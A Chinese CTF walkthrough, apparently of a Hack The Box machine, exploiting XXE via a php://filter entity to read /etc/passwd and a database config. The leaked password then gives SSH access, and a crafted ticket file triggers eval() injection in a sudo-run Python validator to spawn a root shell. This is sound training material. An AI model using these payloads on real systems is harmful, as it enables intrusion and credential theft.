> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/meFmXQrBnatT69-t00O61g)

一分钟恋人. mp3 音频： 进度条 _00:00_ / _03:58_ 后退 15 秒 倍速 快进 15 秒

**一、信息收集**  

**0x01 使用 nmap 进行端口扫描**

```
sudo nmap -sV -sT -sC 10.10.11.100
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkn0Yss3vTicqUJRCiaxJCRSYxmXV83V3l67svYalcswoW5F8ta42vhznw/640?wx_fmt=png)

**0x02 访问 web 页面**

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkrn4PpEibWViaC1fmtskdkOuiczBQlhcDkESmaZcia8OCPBO7tMM3TFPYFg/640?wx_fmt=png)

点击 PORTAL 会进行跳转

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkwPIug2v3awGeeIC46T5BRcpAWiaHdsRu55vHN8vD5u5jl7A22y3xNFg/640?wx_fmt=png)

跳转到新页面

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkUBakITo2Iso6QFpviaLOLN9trDVYhlGNRJ4QJpB4zyRdd3uThyLgrDw/640?wx_fmt=png)

**0x03 进行 XSS、SQL 注入尝试**

(1):XSS 失败

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkMMB3EgM2g8KYc5a2VkmZic8pr0wV0sQx2nJWjfUPBmjK7J8RjGEtceQ/640?wx_fmt=png)

(2):SQL 注入

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkJJhKQbFcT8eIVwCCDqkqrxlcOpARtZsmRcxKQqr20OnNQIHYbNPTfQ/640?wx_fmt=png)

似乎都没有什么收获，走投无路了，只能 fuzz 了，毕竟万物皆可 fuzz。

**0x04 进行 web 扫描**

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVk6Pn8lmRr5d3qqiacZx7XYj4275hg4YicpxuXdicjibicHlc5icXJVMvGibzjA/640?wx_fmt=png)

(1):db.php 为空

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkTuDQkQMdibIsd4jkmoqAcDDO7q6dO5Gicdec8s6lSubdAV3elRnzGTJA/640?wx_fmt=png)

(2):resources 存在目录遍历

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkUBPIgzX1vVDxOd95Y1FeglUOfFcPibnibVlLrxAibcc0J9lpne0o3abpg/640?wx_fmt=png)

查看所有文件内容，在 README.txt 中发现了一些线索。

(3): 查看 README.txt

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVk3l2XOMDbichh334aFFmUibH2AyUiaNTU1icPD9RKak9R39u5JX7Lcb5Dww/640?wx_fmt=png)

**0x05 打开 burp，分析流量**

      由于找了一圈都没有找到信息，因此又在页面重新寻找线索，突然看到页面的首页显示着 burp，突然想到之前有师傅说过，burp 是安全人员最不能丢弃的工具，还有一个小 tips，之前我总喜欢使用拦截按钮去抓包，但是我现在喜欢看 HTTP history，这里面总会包含一些跳转的页面，值得分析。

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkhN99XkBv19LF37o3VzeD6d7xnLweNBcfKTg0XEJZ0a2W8MgjLq7Zuw/640?wx_fmt=png)

然后打开 burp 将刚才的页面重新访问了一下，有了惊奇的发现

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkAiabsFiaOM0gP57ZpbfI7ZG5icKdQ0Z2d8yQAjJysjgxH8O0LibgbmTqIQ/640?wx_fmt=png)

      点击提交数据时发现了一个 POST 请求，等等，这个路径好像有点熟悉，之前在 resource 的路径下看到过

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkeokPXKZd6EFSWBMCv3nyjTx2Dmj4SaPgmg9Fakrjzz6CSxibGBbfKeA/640?wx_fmt=png)

这块还有 XML，不会有 XXE 吧

**0x06 发现 XXE 漏洞**

(1): 对 base64 进行解码

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVk0SU305043U7D7BAfeFJwN8IOwEKkDiaesPicCAbBrlr3EF8xOtbWicrpQ/640?wx_fmt=png)

(2): 读取 / etc/passwd 文件

*   第一种方法
    

能文件读取，如果不读取一下 / etc/passwd 文件真对不起 XXE 这个漏洞

```
var xml = `<?xml  version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>admin</cwe>
        <cvss>admin</cvss>
        <reward>admin</reward>
        </bugreport>`
```

读取文件

```
returnSecret(btoa(xml));
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkEj0AFW7uyj4WbsHicbgtjuT65TxqDWUqJ9zqA7PdwiaP0f6tpMm1YeAA/640?wx_fmt=png)

*   第二种方法
    

      也可以使用下面这种方法。打算在 mac 中使用 burp 抓包，但是由于我们启用的是 VPN，因此不能直接抓包，但是可以使用 ew 进行本地端口转发，然后开启 BURP 的 SOCKS 代理就可以抓包了

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkkuY9byMtJN8jKxdYuAsOXZ2XsSvKnccpyGecInkM4QDkSYLcvU77ibQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkP66FjehiacUqsNxEVGmzE3q0EFZZFCRs7s5q6QK8iaveX1yc7bLAAZBg/640?wx_fmt=png)

(3): 进行 base64 解码

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVk4ficCWzLrGE3sHEickiaGfEOKNYUFqOw82Zr5X07G1WSyic7I5AhGcqSkA/640?wx_fmt=png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

      现在拿到账号了，而且也开启了 22 端口，但是现在问题是没有密码。怎么能搞到密码呢？突然想起来我们还有一个 db.php 文件，db 里面不存放密码存放什么呢？使用 php 伪协议进行文件读取，由于 linux 的默认目录都在 / var/www/html 目录下，尝试读取文件。

(4): 读取之前看到的数据库文件

       由于之前在 resource 目录下看到了 db.php 文件，在 linux 下一般 web 目录都在 / var/www/html 目录下，读取 db.php 文件

```
var xml = `<?xml  version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>admin</cwe>
        <cvss>admin</cvss>
        <reward>admin</reward>
        </bugreport>`
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkgzkbus7kiawIhr4JqEYBEJc8EPhdL7bspiagib0ceqhIHvUa24Fh9DXMA/640?wx_fmt=png)

读取文件

```
returnSecret(btoa(xml));
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkPViaNVRuxJAzggicyTIB6MXPegxHjfX861AicU4UvVOa9yYu7rY0qiaBnA/640?wx_fmt=png)

(5): 进行 base64 解码

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkISvRux66Lpk6nOKib2NFxJRa9dNfLWplQpavHebuibQ0PiahUVHxzibNAA/640?wx_fmt=png)

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

      拿到了一个账号密码，但是怎么是 dbname 和 dbpassword 呢？这是在逗我吗？没有开放数据库端口啊。但是，很多情况下，数据库账号密码和 ssh 可能是一致的，此时欣喜若狂，感觉直接可以起飞了。

**二、获取权限**

0x01 登陆失败

(1): 尝试 ssh 登陆

```
admin / m19RoAU0hP41A1sTsq6K
root / m19RoAU0hP41A1sTsq6K
test / m19RoAU0hP41A1sTsq6K
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVk0j80ibzCB0QYOM8iciaiaAv3jBciaFIq1jdzib7ADic2BUotAbqr4MXPFJxKA/640?wx_fmt=png)

       完了，BBQ 了，三个账号都登陆不上去。突然想起来，/etc/passwd 中有一个 uid 为 1000 的账号，这个账号就是我最后的希望了。

**0x02 登陆成功**

可谓是山穷水复疑无路，柳暗花明又一村啊。

```
development / m19RoAU0hP41A1sTsq6K
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkyiagmAicyzWjxfib6yMN2CEmEibOgZkrqzwIvjkvWBQTibtCBbmy11Y2fQQ/640?wx_fmt=png)

**三、提升权限**

**0x01 信息收集**

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkWfP0VL6UPcw7ibYFHQH9GcWU1135uXVgChrFycaamia4Wfz9EBVr4XXQ/640?wx_fmt=png)

      获取了 development 的 flag，但是查看 contract.txt 文件内容的意思，这是可以提权啊

**0x02 查看特权文件**

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkwyficzHeNe9cyeCAGNiayT0AibXWP6Y0Z6y7j2GbXCu7Akny18DicQFViag/640?wx_fmt=png)

**0x03 查看 python 文件**

```
cat /opt/skytrain_inc/ticketValidator.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkwziciaxWek7KzyWILEf0I2ONaD5lCHuic36QdNCTZzt3X2Kr7VMciaUhUg/640?wx_fmt=png)

代码如下  

```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):       #判断文件是否以.md结尾，如果以.md结尾，那么就打开文件，读取内容，否则退出，说明我们需要创建一个.md后缀的文件
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):     #判断第一行是否是# Skytrain Inc，如果不是就返回错误，说明第一行内容需要是# Skytrain Inc
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):      #判断第二行是否是## Ticket to ，如果不是就返回错误，说明第二行内容需要是## Ticket to  
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):           #判断某行是否以__Ticket Code:__开头，如果该行以这个开头，比如此时第三行是i，那么code_line就是4，然后执行continue
            code_line = i+1
            continue

        if code_line and i == code_line:               #等再次执行到这时，此时code_line和i都是4，此时条件成立，继续执行
            if not x.startswith("**"):                 #此时判断第四行是否以**开头，如果不是以**开头，则返回错误
                return False
            ticketCode = x.replace("**", "").split("+")[0]         #然后去掉**，然后取出+前面的数字
            if int(ticketCode) % 7 == 4:                           #第四行开头的数字需要和7取余然后余4
                validationNumber = eval(x.replace("**", ""))       #再次确保去掉开头的**
                if validationNumber > 100:                         #上面已经执行了命令，感觉是否大于100好像也没什么用
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

**0x04 编写. md 文件**

```
sudo vim /tmp/shell.md
```

内容如下:

```
# Skytrain Inc 
## Ticket to 
__Ticket Code:__
**11+ 11 == 22 and __import__('os').system('/bin/bash') == False
```

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkEx54741LvxiavA2FYmlUk581rZsKpicwz9CP589v4w7IkJKriaM83xSOQ/640?wx_fmt=png)

**0x05 执行脚本获取 root 权限**

```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

然后输入文件路径

![](https://mmbiz.qpic.cn/mmbiz_png/48oBicpxrQuViankqumF48hwm01s2mWhVkkibw4KYs9GIEI5qib5AsF4h7dm7JQhElkjjxjcpZrzaeTv1CPHmbSwCw/640?wx_fmt=png)

成功获取 root 的 flag

**四、复盘总结**

**0x01 思路**

(1): 进行端口扫描，获取 web 和 ssh 信息

(2): 发现 web 页面，使用 burp 进行抓包，发现隐藏页面

(3): 对隐藏页面进行分析，发现存在 XXE 文件读取漏洞

(4): 成功读取 / etc/passwd 和 db.php 文件，db.php 中存在一个可以登陆 ssh 的密码，但是账号还不清楚

(5): 通过用户名枚举尝试，成功找到 ssh 账号和密码

(6): 成功获取普通用户 development 的权限，获取 flag

(7): 使用 suid 提权，成功获取 root 的 flag

**0x02 注意点**

(1): 以后渗透开始就应该挂着 burp，如果不是看到首页提示，可能不会想到挂着 burp 去看 HTTP history，这样就不能找到 XXE 这个漏洞

(2): 对 python 代码熟悉，要一步一步去分析代码，构造对应的 payload